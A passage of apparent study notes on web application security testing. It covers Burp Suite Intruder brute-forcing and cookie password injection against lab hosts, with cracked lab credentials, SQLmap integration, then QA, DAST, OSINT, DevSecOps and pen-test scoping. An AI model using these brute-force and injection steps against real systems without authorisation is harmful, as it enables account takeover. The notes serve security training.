			§ Initial attempt: Manual login with admin/admin failed.

			§ Process:

				□ Capture login POST request.

				□ Send to Intruder via Burp actions.

				□ Select Positions tab → mark input fields (e.g., password) with section markers.

		○ Configuring Payloads

			§ Payloads Tab:

				□ Load wordlists (e.g., /usr/share/wordlists/metasploit/unix\_passwords.txt).

				□ Options for payload processing: add prefixes, suffixes, modify case, etc.

			§ Encoding Options: Can transform payloads if required (e.g., Base64).

		○ Running the Attack

			§ Options Tab: Controls attack behavior (redirect handling, result processing, etc.).

			§ Attack Results:

				□ Initial run → all responses were 709 bytes (indicating failed logins).

				□ Second run with payload processing (modify case → capitalize first letter).

				□ Entry 28 (Password1) produced a different response size (512 bytes).

			§ Analyzing Results

				□ A response with different length/status often signals success.

				□ Verification showed admin:Password1 successfully logged in.

				□ Intruder flagged this by showing the different response content and size.

			§ Lessons Learned

				□ Intruder is powerful for brute-force and fuzzing attacks.

				□ Wordlists + payload processing increase effectiveness (e.g., case variations).

				□ Response analysis (length, redirects, status codes) is critical to spotting successful payloads.

				□ Attack options like redirection handling affect results visibility.



Manipulating Cookies

	• Burp Suite’s Intruder can be used to manipulate and brute-force cookie values in HTTP requests. By modifying cookies in intercepted messages and automating payload injection, testers can uncover hidden authentication mechanisms and gain access to restricted areas.

	• Key Concepts

		○ Enabling Cookies in Burp’s Browser

			§ Cookies are disabled by default in Burp’s browser.

			§ Must enable them via: Settings → Privacy \& Security → Cookies → Allow all cookies.

		○ Target Setup

			§ Logged into the DAP server (10.10.10.86) with admin:Password1.

			§ Main site showed nothing interesting, but another service on port 8080 displayed:

				□ “Access denied: password authentication cookie not set.”

			§ Observed request contained a session ID cookie, but no password field.

		○ Injecting a Cookie Value

			§ Hypothesis: A password field must exist in the cookie.

			§ Used Proxy → Intercept ON to capture request.

			§ Added:

				Cookie: sessionid=xyz; password=password1

			§ Server responded: “password authentication cookie incorrect” → confirmed cookie injection works but wrong password.

		○ Brute Forcing with Intruder

			§ Sent the modified request to Intruder.

			§ Cleared existing section markers, set the password cookie value as the payload position.

			§ Loaded wordlist (unix\_passwords.txt) as payload source.

			§ Ran attack:

				□ Most responses = 491 bytes (failed logins).

				□ Entry 41 (password=secret) = 707 bytes (different response).

				□ Rendering response confirmed successful access to a TCP ticket test page.

		○ Lessons Learned

			§ Cookies can contain hidden authentication fields, not just session IDs.

			§ Burp Intruder is effective for automating brute force attacks on cookie values.

			§ Response size and content differences are critical in detecting successful payloads.

			§ Insecure design (storing passwords in cookies) creates significant risk.



The Four Intruders

	• Burp Suite’s Intruder module supports four different attack types—Sniper, Battering Ram, Pitchfork, and Cluster Bomb—each suited to different testing scenarios. Combined with multiple payload types (lists, runtime files, brute force generators), Intruder provides a highly flexible and powerful tool for automated attacks against web applications.

	• Key Concepts

		○ Intruder Attack Types

			§ Sniper (default)

				□ Uses a single payload set.

				□ Best for testing one field at a time.

				□ If applied to multiple fields, it cycles through each field while keeping others fixed.

				□ # of requests = (payload entries × # of fields tested).

			§ Battering Ram

				□ Also uses a single payload set.

				□ Applies the same payload value to multiple fields at once.

				□ Useful when same input required across fields (e.g., username = password).

				□ # of requests = payload entries.

			§ Pitchfork

				□ Uses multiple payload sets (one per field).

				□ Uses the nth entry from each list simultaneously across fields.

				□ Example: 5th request = 5th value from each payload set.

				□ # of requests = size of the smallest payload list.

			§ Cluster Bomb

				□ Uses multiple payload sets.

				□ Tries every combination across all fields.

				□ Very powerful but grows exponentially.

				□ # of requests = product of payload set sizes.

		○ Payload Types

			§ Simple List: Manually or from a file.

			§ Runtime File: Dynamically loaded during attack.

			§ Brute Forcer: Generates values on the fly.

				□ Tester specifies character set and min/max length.

				□ Example: Between 4–6 chars → >1.5 million combinations.

				□ Extremely time-consuming for longer lengths.

		○ Practical Notes

			§ Intruder results depend heavily on:

				□ Correctly identifying input fields.

				□ Smart payload list selection.

				□ Attack type matching the test case.

			§ Example use cases:

				□ Sniper: SQL injection fuzzing on one parameter.

				□ Battering Ram: Username = Password brute force.

				□ Pitchfork: Coordinated parameter testing.

				□ Cluster Bomb: Exhaustive parameter combination testing.



#### Extensions



Using C02 to integrate SQLMap

	Burp Suite can be extended with BApp Store extensions. The CO2 extension integrates SQLmap directly into Burp Suite, allowing testers to quickly launch SQL injection testing from captured requests without manually copying data into the terminal.

	• Key Concepts

		○ Installing Extensions in Burp Suite

			§ Navigate to Extender → BApp Store.

			§ Many extensions are available to extend Burp’s functionality.

			§ CO2 is a commonly used extension for SQLmap integration.

		○ Setting Up CO2

			§ After installation, CO2 appears as a new tab in the menu bar.

			§ Configuration requires the path to SQLmap, e.g.:

				/usr/share/sqlmap/sqlmap.py

			§ On Linux, xterm must also be installed to run SQLmap through Burp:

				sudo apt install xterm

		○ Using CO2 with Burp Suite

			§ Example target: HackTheBox Falafel (10.10.10.73).

			§ Capture a POST login request.

			§ Right-click the request → Extensions → CO2 → Send to SQLmapper.

			§ CO2 automatically sets up a SQLmap command string for the selected request.

		○ Running the SQLmap Attack

			§ SQLmap can run directly from Burp (launches in xterm).

			§ Alternatively, testers can copy the generated SQLmap string and run it manually in a terminal.

			§ Result: SQL injection vulnerabilities are detected, same as when running SQLmap independently.

		○ Key Benefits

			§ Saves time by integrating SQLmap workflow inside Burp Suite.

			§ Provides a seamless bridge between manual request capture and automated SQL injection testing.

			§ Flexible: Run SQLmap inside Burp or extract the command for external use.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#### Dynamic Application Security Testing

#### Security Testing in QA



Software Quality Assurance Process

	• The central theme is that security should be treated as a function of quality within the Software Development Life Cycle (SDLC). By embedding security testing into quality assurance (QA) practices, security flaws can be addressed as code defects (bugs), ensuring applications are both functional and secure.

	• Key Concepts

		○ SDLC (Software Development Life Cycle)

			§ A structured process for taking software from an idea to a deployed solution.

			§ Phases include requirements gathering, design, coding, testing, deployment, and maintenance.

			§ It is cyclical: new requirements or changes feed back into earlier phases.

		○ Integrating Security into QA

			§ Security should not be an afterthought or add-on.

			§ Instead, it should be embedded into QA processes as a measure of software quality.

			§ Security defects should be treated like any other bug in the backlog.

		○ Software Quality Assurance (QA)

			§ QA ensures applications meet defined quality standards before release. Activities include:

				□ Technical reviews to identify flaws.

				□ Documenting and testing strategies for repeatability and reliability.

				□ Defining and enforcing standards for developers and testers.

				□ Change control procedures to maintain system integrity.

				□ Metrics and measurements to validate quality standards.

		○ Traditional vs. Modern View of Security

			§ Historically: Security was often reduced to login/password checks and considered separately from quality.

			§ Modern perspective: Due to advanced cyber threats, robust security must be built in as part of quality, just like usability, reliability, or efficiency.

		○ Quality Dimensions Developers Recognize

			§ Developers typically focus on: portability, reliability, testability, flexibility, efficiency, and usability.

			§ Security should be added to this list and considered an equal aspect of quality.

		○ Cultural and Team Perspective

			§ Developers may not naturally see security as part of quality, but that provides an opportunity to educate and align teams.

			§ The shared goal is to ensure apps work as intended while minimizing risk from attackers.



Positive Testing

	• Positive testing verifies that an application behaves as expected when given valid inputs. From a security standpoint, positive testing ensures that core security controls—such as authentication, authorization, password management, and session management—function correctly. Automating these tests strengthens application security and reliability.

	• Key Concepts

		○ Definition of Positive Testing

			§ Focuses on providing valid input and checking whether the actual output matches the expected output.

			§ Example: Entering a valid U.S. ZIP code (e.g., 87104) should correctly populate the corresponding city and state.

		○ Functional Positive Testing

			§ Ensures that critical application features work as intended.

			§ Example: An e-commerce app must successfully allow purchases; if not, it’s not ready for production.

			§ Functional positive tests come from requirements documents and help confirm baseline app usability.

		○ Positive Security Testing

			§ Unlike functional tests, security-related positive tests must be deliberately designed by the QA/security team. These focus on validating that security controls work as intended:

				□ Access control: Does the app require a login? Can users only access their own profile/data?

				□ Authorization: Can users only access pages, forms, and data appropriate to their role?

				□ Password management:

					® Front-end: Can users set and reset passwords properly?

					® Back-end: Are passwords stored securely as salted hashes?

				□ Session management: Are sessions established and destroyed correctly? Is traffic always encrypted in transit?

		○ Guidance \& Resources

			§ OWASP Web Security Testing Guide can provide detailed procedures and ideas for designing these security test cases.

		○ Automation

			§ Once positive security test cases are built, they can be automated.

			§ Automation ensures that with every new release/version, security controls are consistently validated.

			§ This creates a reliable baseline of core security requirements.



Negative Testing

	• Negative testing is about deliberately providing unexpected or malicious input to an application to see if it behaves incorrectly, leaks data, or becomes vulnerable to attack. It complements positive testing by preparing applications to resist real-world threats, making it an essential part of security-focused QA.

	• Key Concepts

		○ Definition of Negative Testing

			§ Sending unexpected, invalid, or malicious input to see how the app reacts.

			§ Goal: Ensure the app doesn’t do anything it’s not supposed to do.

			§ Example: Using escape characters to test for SQL injection attempts (e.g., extracting usernames or dropping tables).

		○ Difference from Positive Testing

			§ Positive testing is finite and straightforward, derived from functional requirements (what the app should do).

			§ Negative testing is broader and harder to scope, since attackers have nearly infinite input combinations and strategies (what the app shouldn’t do).

		○ Approaches to Negative Testing

			§ Start with misuse cases: scenarios where the app could be abused.

			§ Derive tests from:

				□ Security standards (internal \& external).

				□ OWASP Top 10: Each category represents a class of common attacks (e.g., injection, broken authentication, insecure deserialization).

				□ OWASP Cheat Sheet Series: 78+ guides with defensive coding practices developers should follow (from AJAX to XML).

		○ Test Case Examples

			§ SQL Injection: Attempting to extract data from a known table.

			§ Authorization bypass: Checking if restricted data can be accessed without proper permissions.

			§ Session handling abuse: Seeing if sessions persist when they shouldn’t.

		○ Automation \& Integration

			§ Automating negative test cases (especially for OWASP Top 10 vulnerabilities) helps catch issues continuously.

			§ QA processes become more robust when negative testing is part of standard practice.

		○ Developer Collaboration

			§ Negative testing not only strengthens security but also reinforces developer awareness of secure coding practices.

			§ Validating that defensive coding principles (from cheat sheets) are actually applied.

			§ When an app passes these tests, it’s both a technical and cultural win for the dev team.



SQA Metrics

	• Software Quality Assurance (SQA) metrics are essential for measuring, tracking, and improving both security and the testing process itself over time. They help identify strengths, weaknesses, gaps, and trends in software security, ultimately leading to more secure and reliable applications.

	• Key Concepts

		○ Purpose of SQA Metrics

			§ Measure how well the app performs under security testing—both now and in the future.

			§ Identify strengths, weaknesses, and gaps in testing processes.

			§ Improve efficiency by eliminating redundant tests and finding missing ones.

			§ Support continuous improvement in both software security and QA methods.

		○ Security Foundations

			§ CIA Triad (Confidentiality, Integrity, Availability):

				□ Confidentiality: Keeping secrets secret.

				□ Integrity: Preventing unauthorized changes.

				□ Availability: Ensuring systems stay online and accessible.

				□ Priority differs by organization (e.g., integrity critical for nuclear plant systems, availability critical for e-commerce).

			§ ISO/IEC 25010 Standard:

				□ Provides a comprehensive quality model for software.

				□ Since 2011, security became its own characteristic, broken into five sub-characteristics:

					® Confidentiality

					® Integrity

					® Non-repudiation (prove events occurred)

					® Accountability (assign actions to an owner)

					® Authenticity (prove identity of person/resource)

		○ Guidance Sources

			§ OWASP Developer Guide Project: Focuses on confidentiality and integrity; offers best practices for SQA metrics and processes.

			§ OWASP Application Security Metrics:

				□ Direct metrics: Within the software (e.g., lines of code, languages, security mechanisms, configs).

				□ Indirect metrics: Outside the software (e.g., documentation completeness, developer training, reporting processes).

		○ Core Metrics to Track

			§ Security bugs detected vs. security bugs remediated:

				□ Critical to monitor in every development environment.

				□ Helps security teams apply compensating controls and track whether the gap is shrinking or widening.

		○ Additional Resources

			§ NIST SAMATE (Software Assurance Metrics and Tool Evaluation):

				□ Provides frameworks, datasets, and test suites for measuring software vulnerabilities.

				□ Bugs Framework: Categorizes vulnerabilities (auth/authz issues, randomness flaws, etc.) and ties into MITRE CWE.

				□ Juliet Test Suites \& Software Assurance Reference Dataset: Thousands of test programs to help build test cases.

				□ Though not updated frequently, still highly valuable.

		



OWASP Testing Guide

	• The OWASP Web Security Testing Guide is a flagship OWASP project that serves as a comprehensive framework for structuring, conducting, and integrating security tests into QA, source code reviews, and penetration testing. It provides a structured, repeatable approach that saves time, ensures coverage, and ties test results back to business objectives.

	• Key Concepts

		○ Value of the OWASP Testing Guide

			§ Considered a cornerstone resource for web application security testing

			§ Provides ~80% of what a penetration tester or QA engineer needs to conduct thorough tests.

			§ The same tests used in penetration testing can (and should) be integrated into QA workflows.

		○ OWASP Project Categories

			§ Flagship projects: Mature, strategic, widely adopted (e.g., Testing Guide).

			§ Production projects: Production-ready but still growing.

			§ Other projects: Tools, documentation, or early-stage projects (lab, incubator, playground).

			§ The Testing Guide is flagship status, emphasizing its credibility and maturity.

		○ Key Sections of the Testing Guide

			§ Section 2.9 – Security Test Requirements

				□ Identify testing objectives first.

				□ Align activities with threat and countermeasure taxonomies.

				□ Differentiate between functional vs. risk-driven security requirements.

				□ Build use and misuse cases.

			§ Section 2.10 – Integration into Workflows

				□ Clarifies what developers should handle (unit tests) vs. what testing engineers should own (integration, functional, operational tests).

				□ Helps embed security testing naturally into the SDLC.

			§ Section 2.11 – Making Sense of Results

				□ Transform test outcomes into metrics and measurements.

				□ Track progress over time.

				□ Ensure results are linked back to business use cases to prove organizational value.

		○ Practical Use in QA

			§ The full 200+ page guide is detailed but not efficient for real-time use.

			§ Best practice: distill it into a testing checklist or spreadsheet with:

				□ Test name

				□ Test description

				□ Tools/techniques

				□ Results tracking

			§ Community has built enhanced tools (e.g., GitHub spreadsheet with risk assessment calculators and summary findings tabs).

		○ Automation \& Continuous Testing

			§ Start with manual tracking and use checklists as a requirements stock.

			§ Gradually automate tests to scale coverage and efficiency.





#### Assessing Deployed Apps



Manual vs Automated Testing

	• Effective application security testing requires a balance of manual and automated testing, informed by static analysis and aligned with organizational security maturity models. Automated tools provide speed and coverage, while manual testing delivers context, deeper insight, and business logic validation. Together, they provide a more complete security picture.

	• Key Concepts

		○ Balancing Manual and Automated Testing

			§ Automated scans are fast, repeatable, and can reveal many flaws quickly.

			§ Manual testing validates findings, eliminates false positives, and identifies complex vulnerabilities (e.g., business logic flaws, chained exploits).

			§ The best results come from combining both.

		○ Foundation in Static Testing

			§ Before running dynamic tests, review:

				□ Application documentation

				□ Security requirements

				□ Source code security reviews

				□ Results of static tests (e.g., against OWASP Top 10)

			§ This preparation helps focus dynamic tests on known risks and fine-tune tools to avoid breaking apps during scans.

		○ Dynamic Testing Tools

			§ OWASP ZAP: Automates discovery of flaws, allows tuning (exclude sensitive URLs, force-browse hidden paths).

			§ SQLMAP: Useful if static reviews reveal weaknesses in SQL injection defenses.

			§ Automated scans often include remediation advice, saving time.

		○ Manual Testing Strengths

			§ Validate automated findings (weed out false positives).

			§ Explore business logic flaws missed by scanners.

			§ Combine lower-severity issues into real-world attack chains.

			§ Provide attacker-like creativity that tools can’t replicate.

		○ No “Perfect Model”

			§ George Box’s quote: “All models are wrong, some are useful.”

			§ There’s no universal formula for the right balance between static/dynamic, manual/automated testing.

			§ The right approach depends on organizational security maturity and available resources.

		○ Maturity Models for Guidance

			§ OWASP SAMM (Software Assurance Maturity Model):

				□ Ties security practices to business functions (governance, design, implementation, verification, operations).

				□ Verification phase gives guidance on security testing.

			§ BSIMM (Building Security In Maturity Model):

				□ Domains: governance, intelligence, SDLC touchpoints, deployment.

				□ Security testing lives in the SDLC touchpoints domain.

			§ Mapping: OWASP maintains a SAMM ↔ BSIMM mapping for blended use.

		○ Iterative Improvement

			§ Any testing is better than none.

			§ Start small → prototype → iterate → improve.

			§ Discard what doesn’t work, keep refining the balance

			§ Goal: Over time, find the right mix of automation and manual effort to secure applications effectively.



Scanning vs Pen Testing

	• Automated scanning is not the same as penetration testing. Scans collect information and identify potential weaknesses, while penetration testing uses human creativity and strategy to exploit those weaknesses, uncover business logic flaws, and simulate real-world attacks. Both are important, but they serve different roles in a security testing strategy.

	• Key Concepts

		○ Scanning

			§ Definition: Automated collection of information and detection of potential vulnerabilities.

			§ Scope: Should include applications, host systems, backend databases, and network appliances.

			§ Techniques:

				□ Signature-based scanning: Detects known issues (e.g., missing patches, version numbers).

				□ Heuristic scanning (trial and error): Simulates input to discover how the app responds.

				□ Fuzzing: Sending malformed/semi-malformed data, special characters, large/negative numbers to elicit responses that could reveal flaws.

			§ Purpose: Prioritizes findings by risk but does not try to break the system.

			§ Tools:

				□ Nmap – open ports, admin services (not a vulnerability scanner).

				□ Nessus, Nexpose, Qualys – vulnerability scanners for hosts and infrastructure.

				□ OWASP ZAP, Wfuzz, Burp Suite Intruder – web app scanning and fuzzing tools.

				□ OWASP maintains curated lists of scanning tools (Appendix A of Testing Guide, community lists).

		○ Penetration Testing

			§ Definition: A human-driven process that attempts to exploit vulnerabilities to achieve specific goals.

			§ Key Differences from Scanning:

				□ Goes beyond detection—tests exploitation.

				□ Uses creativity and unconventional thinking.

				□ Targets business logic flaws and full application workflows that automated tools can’t handle.

				□ Can combine results from scanners with manual techniques.

			§ Goals:

				□ Access restricted data.

				□ Escalate privileges (e.g., compromise an admin account).

				□ Test resilience of app logic.

			§ Human Element: Pen testing leverages creativity; AI may assist in future, but humans remain essential.

		○ Relationship Between Scanning and Pen Testing

			§ Scans come first: Gather baseline information and identify likely weak points.

			§ Pen tests build on scan results: Validate and exploit vulnerabilities to measure real-world impact.

			§ Together, they provide a comprehensive security assessment.

		○ Community and Resources

			§ OWASP Web Security Testing Guide Appendix A: Specialized scanning tools list.

			§ OWASP Phoenix chapter project: Community-curated list of security testing tools.

			§ Burp Suite (PortSwigger): Popular toolset for both QA and penetration testing (advanced features require paid version).



Testing in Production

	• Security testing should be performed in a non-production environment whenever possible. This allows for unrestricted, aggressive testing without risk to live systems, helping uncover vulnerabilities before attackers exploit them in production. However, testing in non-prod requires coordination, backups, and awareness of differences between environments.

	• Key Concepts

		○ Why Test in Non-Production

			§ Non-production = “gloves off” testing: run any test, even destructive ones.

			§ Prevents slowdowns, outages, or data corruption in production.

			§ Let's you identify bugs and vulnerabilities before the app reaches end users.

			§ Criminals will run destructive tests against production—so defenders should test them safely in non-prod first.

		○ Change Control and Organizational Support

			§ Testing in non-prod ties into change control policies:

				□ Validate changes in non-prod before production deployment.

				□ Reduces risk of unplanned outages or business disruption.

			§ Including security testing in change control helps gain management buy-in for strong testing practices.

		○ Scope of Testing

			§ All tests are in scope in non-production (SQL injection, denial of service, data corruption, etc.).

			§ Be as thorough and adversarial as possible—if you skip a test, an attacker won’t.

			§ Identify vulnerabilities that will carry over to production unless addressed.

		○ Caveats and Best Practices

			§ Respect shared environments: Coordinate with other testers to avoid blocking their work.

			§ Backups are essential: Be ready to restore quickly if destructive tests damage the environment.

			§ Environment differences: Code base should match production, but infrastructure may differ—note which vulnerabilities would migrate to production.

		○ If Non-Prod Isn’t Available

			§ At minimum, use a local copy on a developer’s/tester’s machine.

			§ Skipping non-prod testing to save time or money is a false economy—short-term savings lead to long-term costs when attackers find the flaws.



Testing in Production

	• While most security testing should occur in non-production, testing in production environments is also valuable because it reveals vulnerabilities and conditions attackers could actually exploit. However, testing in production requires extreme caution, careful planning, and strict communication to avoid unintended disruption or legal/operational issues.

	• Key Concepts

		○ Why Test in Production

			§ Real-world accuracy: Production and non-production rarely match perfectly (different patch levels, configs, devices). Testing in prod eliminates inaccuracies from environment differences.

			§ Risk validation: A vulnerability critical in non-prod may be mitigated in prod by defenses (e.g., WAF blocking injection attempts).

			§ Publicly exposed data: Only production has real-world DNS records, IP addresses, and TLS certificates—attackers will use this, so defenders must test it too.

		○ Cautions \& Limitations

			§ No authenticated scans in prod: They risk unauthorized data changes or corruption (serious legal/operational consequences).

			§ Less intrusive settings: Tools should be configured to minimize impact—testing here = “kiddie gloves.”

			§ No untested tools in prod: Always vet tools first in non-prod.

		○ Planning \& Communication

			§ Communication is critical and should be overdone rather than underdone:

				□ Notify stakeholders a week before, the day before, the day of, and at the start/end of testing.

			§ First production test should run under change control procedures, ideally in an approved overnight maintenance window.

			§ A clear communication plan and change advisory board involvement ensures coordination and mitigates fallout if problems occur.

		○ Tools \& Methods

			§ Use the same tools as in non-prod, but with adjusted, less aggressive settings.

			§ Testing scope in production should focus on verifying known risks, public exposure, and defenses, not full destructive testing.

		○ Balance with Non-Prod Testing

			§ Non-prod = “gloves off,” break things to learn.

			§ Prod = “kiddie gloves,” cautious validation of real-world risks.

			§ Both are necessary: non-prod to discover flaws, prod to confirm real-world exposure and defenses.



OSINT Gathering

	• Open Source Intelligence (OSINT) gathering uses publicly available information to learn about applications, infrastructure, and organizations. Attackers leverage OSINT for stealthy reconnaissance without alerting defenders, so security teams should also perform OSINT gathering to understand and reduce their exposure.

	• Key Concepts

		○ What is OSINT

			§ Stands for Open Source Intelligence, originating from military and government use.

			§ In web application security, OSINT means collecting publicly available data attackers could use.

			§ Advantage: stealth — attackers don’t need to scan your system directly, reducing detection risk.

		○ Differences: Non-Prod vs. Prod

			§ Non-Production: Usually internal, with little/no OSINT exposure.

			§ Production: Public-facing systems must expose information (DNS entries, IP addresses, TLS certificates, login forms, password resets, etc.).

		○ Why OSINT Matters

			§ Attackers can skip noisy scans and move directly from recon to exploitation.

			§ Defenders lose the chance to stop attacks early and must react once the exploit starts.

			§ Security teams should perform OSINT on their own systems to see what attackers see.

		○ Examples of OSINT Data \& Tools

			§ TLS/SSL Certificates: Reveal key strength, algorithms, and configuration.

				□ Tools: SSL Labs (Qualys), Mozilla Observatory.

			§ DNS \& Subdomains: Identify hosts and linked services.

				□ Tools: DNSdumpster, PentestTools Subdomain Finder.

			§ Existing Search Engines: Already catalog OSINT data.

				□ Tools: Shodan (banners, OS, open ports), Censys (certificate search, admin portals).

			§ Cross-Verification: OSINT can be outdated or incomplete—use multiple sources to validate.

		○ Automation of OSINT

			§ Automating OSINT gathering improves efficiency, just like QA test automation.

			§ Tools/Resources:

				□ Trace Labs OSINT Virtual Machine (preloaded with tools).

				□ Maltego (visual link analysis).

				□ Recon-ng (framework for reconnaissance).

			§ Inspired by the older Buscador VM project.

		○ Defensive Benefits

			§ By performing OSINT internally, organizations:

				□ Understand what attackers already know.

				□ Identify overexposed information.

				□ Improve defenses (e.g., tightening TLS, removing exposed admin portals).

			§ Embedding OSINT into dynamic application security testing (DAST) provides a more complete security view.



Web App Proxies

	• Web application proxies are critical tools for security testing because they intercept and allow manipulation of traffic between a client and a web application. They enable testers to inspect, modify, and analyze requests and responses—helping to identify weaknesses that attackers could exploit.

	• Key Concepts

		○ What is a Web Application Proxy

			§ A software component that sits between the client and the server.

			§ Captures all requests and responses for inspection and manipulation.

			§ Essential in every web application security assessment.

		○ Relation to Attacks

			§ Similar to a man-in-the-middle (MITM) attack technique:

				□ Attackers may use proxies to spy on sensitive data (passwords, tokens).

				□ Can manipulate traffic (redirect, alter requests) before reaching the server.

			§ Testers use proxies ethically to validate that apps cannot be compromised in this way.

		○ Defenses Against Proxy-based Attacks

			§ Encrypt data in transit with SSL/TLS certificates.

			§ Enforce HTTP Strict Transport Security (HSTS):

				□ Forces HTTPS only.

				□ Forces HTTPS only.

		○ Types of Proxies

			§ Web Proxies: Handle HTTP/HTTPS only.

				□ Browser-based plugins (e.g., Tamper Dev for Chrome, Tamper Data for Firefox Quantum).

				□ Good for most web testing.

			§ TCP Proxies: Handle all TCP traffic, including non-web protocols.

				□ Needed for broader protocol testing.

		○ Popular Proxy Tools

			§ Burp Suite (Enterprise, Professional, Community):

				□ Includes Burp Proxy, the core feature other modules rely on.

			§ OWASP ZAP: Open-source alternative, widely used.

			§ Fiddler: Longstanding proxy tool, useful for HTTP/S traffic.

			§ Browser extensions: Tamper Dev, Tamper Data (for request/response inspection \& manipulation).

		○ Best Practices for Security Testing with Proxies

			§ Use proxies to inspect and manipulate traffic to simulate potential attacks.

			§ Integrate proxies into dynamic application security testing (DAST) workflows.

			§ Experiment with different tools, then adopt the one(s) best suited for your testing needs.



DevSecOps

	• DevSecOps integrates security into the fast-paced DevOps model, ensuring security is embedded into CI/CD pipelines without disrupting development. Security must evolve alongside development and operations, using automation, collaboration, and OWASP guidance to reduce business risk while keeping up with rapid release cycles.

	• Key Concepts

		○ Shift in Development Models

			§ Traditional: monolithic software with updates a few times a year.

			§ Modern: agile/DevOps with updates multiple times per week.

			§ Ops and security had to adapt to faster release cycles.

		○ DevOps vs. DevSecOps

			§ DevOps: Dev + Ops share tools and practices to improve speed and efficiency.

			§ DevSecOps: Security is embedded, not siloed.

				□ Blends business acumen + technical security knowledge.

				□ Goal: risk reduction to minimize business disruptions.

			§ Without security in the pipeline, incident risk rises significantly.

		○ CI/CD Pipeline

			§ Core of DevOps, often represented by an infinity loop (continuous flow, no start or end).

			§ CI = Continuous Integration, CD = Continuous Delivery/Deployment.

			§ Non-linear, always moving—security must integrate seamlessly.

		○ Challenge for Security Professionals

			§ Security often wasn’t included when DevOps pipelines were first built.

			§ Task: find ways to integrate security without disrupting workflow.

			§ Forcing intrusive security measures can lead to resistance and failure.

		○ OWASP DevSecOps Guidelines

			§ Security practices/tools to insert into pipelines:

				□ Secret scanning – detect hardcoded credentials.

				□ Software Composition Analysis (SCA) – find vulnerabilities in third-party libraries.

				□ Static Application Security Testing (SAST) – analyze source code.

				□ Infrastructure-as-Code (IaC) scanning – check cloud deployments.

				□ Container scanning – test containerized apps for weaknesses.

				□ Dynamic Application Security Testing (DAST) – analyze running apps (this course’s focus).

				□ Infrastructure scanning – test supporting systems/components.

				□ Compliance checks – ensure alignment with internal/external requirements.

		○ Cloud-Native Pipelines

			§ CI/CD pipeline tools from major cloud providers:

				□ AWS CodePipeline

				□ Azure Pipelines

				□ Google Cloud Build

			§ Security should integrate into these native pipelines.

		○ Best Practices for Implementation

			§ Embrace DevSecOps as a mindset, not just a toolset.

			§ Educate dev/ops teams on where and how security fits.

			§ Meet teams where they are: integrate into their workflows rather than disrupting them.

			§ Look for opportunities to automate security testing within existing pipelines.





#### Web App Pen Testing



Scoping a Web App Pen Test

	• Scoping a web application penetration test is critical to ensure that testing is goal-driven, clearly defined, and aligned with business, technical, and legal constraints. Proper scoping prevents wasted effort, reduces risk of disruption, and ensures compliance with hosting providers’ rules of engagement.

	• Key Concepts

		○ Define the Goal

			§ The end goal drives the scope:

				□ Data-centric: Access restricted/sensitive data (e.g., PCI DSS, HIPAA requirements).

				□ Account-centric: Gain access to another user’s or admin’s account and test potential damage.

			§ Clarifying the test’s objective ensures focus on the right assets.

		○ Define What’s In and Out of Scope

			§ URLs / Applications: Confirm exact apps, subdomains, or subdirectories in-scope.

			§ Exclusions: Identify pages that should not be tested (e.g., admin or password reset).

			§ IP addresses / Net blocks: Apps may be accessible directly via IP addresses (sometimes forgotten or decommissioned systems).

			§ User accounts: Determine if valid test accounts will be provided and whether certain user/admin accounts are off-limits.

		○ Timing Considerations

			§ Testing can impact availability or performance. Minimize risk by:

				□ Avoiding peak business times (e.g., e-commerce during holidays).

				□ Respecting industry-specific blackout periods (e.g., code freezes).

				□ Testing during maintenance/change windows where possible.

			§ Coordinate with ops and security teams to avoid false alarms from alerts.

		○ Non-Production Testing

			§ Use non-production environments for high-risk exploits.

			§ Proving an exploit in non-prod + reviewing change controls may be enough to validate production exposure, reducing business risk.

		○ Documentation

			§ Never assume. Get scoping details in writing to avoid misunderstandings.

			§ Clearly define: in-scope systems, exclusions, accounts, time frames, and change-control approvals.

		○ Cloud Hosting Provider Requirements

			§ Each provider has its own penetration testing rules:

				□ AWS: Explicit policies outlining what’s allowed.

				□ Azure: No prior notification needed, but must comply with unified rules of engagement.

				□ Google Cloud: No notification needed, but must follow acceptable use policy \& ToS.

			§ Other providers: always check before testing.



Avoiding Production Impacts

	• Penetration testing in production must be carefully managed to avoid disrupting live systems. Poorly scoped or miscommunicated tests can cause serious operational, legal, and reputational issues. By properly engaging stakeholders, documenting scope, and testing in non-production first, testers can minimize risks while still achieving valuable security insights.

	• Key Concepts

		○ Risks of Testing in Production

			§ Pen tests can accidentally cause:

				□ Slowdowns or outages.

				□ Corrupted databases.

				□ Business-critical failures.

			§ Mistakes can create organizational fallout (e.g., legal, HR, diversity issues in the shared story).

			§ Over-testing = higher risk but more comprehensive results.

			§ Under-testing = less risk but leaves blind spots, creating a false sense of security.

		○ Scoping Trade-Offs

			§ Inclusive scope → thorough test, more findings, but higher chance of breaking production.

			§ Restricted scope → safer and faster, but may miss real risks.

			§ Pen test scoping is always a balancing act.

		○ Five-Step Process to Reduce Production Impacts

			§ Communicate with stakeholders

				□ Meet with all stakeholders (IT, HR, legal, business leaders).

				□ Be transparent about tools, methods, risks, and benefits.

			§ Document risks and conversations

				□ Capture agreements and concerns in the project plan or statement of work.

				□ Clarify the link between scope restrictions and the accuracy of findings.

			§ Call out exclusions explicitly

				□ If forms, accounts, or endpoints are excluded, note they won’t be tested.

				□ Highlight that excluded elements may still represent common attack vectors (e.g., SQL injection).

			§ Review and approve the plan

				□ Go over documentation with stakeholders before starting.

				□ Get explicit approval of what is and isn’t in scope.

			§ Test first in non-production

				□ Run tools against non-prod to gauge impact.

				□ Adjust settings or methods before applying to production.

		○ Lessons Learned

			§ Miscommunication can cause major reputational damage, even if no real harm was intended.

			§ Over-communicate, document everything, and gain approval before testing.

			§ Experience and preparation separate reckless testing from professional security assessments.



Penetration Testing Execution

	• The Penetration Testing Execution Standard (PTES) provides a structured, seven-phase framework for conducting penetration tests—from scoping to reporting. By following PTES, testers leverage best practices developed by industry experts, ensuring tests are thorough, realistic, and aligned with business needs.

	• Key Concepts

		○ PTES as a Framework

			§ Provides expert guidance covering the full penetration testing lifecycle.

			§ Organized into seven phases, visualized as a funnel: broad early activities (info gathering) → narrower, focused later stages (exploitation, reporting).

			§ Helps testers avoid wasted effort and deliver comprehensive, business-relevant results.

		○ Seven Phases of PTES

			§ Pre-Engagement Interactions

				□ Define scope (in-scope vs. out-of-scope systems, URLs, accounts).

				□ Establish rules of engagement: timelines, procedures if detected/blocked.

				□ Communicate with third parties (MSSPs, hosting providers).

				□ Update communication plan (contacts, notification process).

			§ Intelligence Gathering

				□ Collect as much information as possible about the target app/infrastructure.

				□ Balance active (direct scanning) vs. passive (stealthy OSINT) methods.

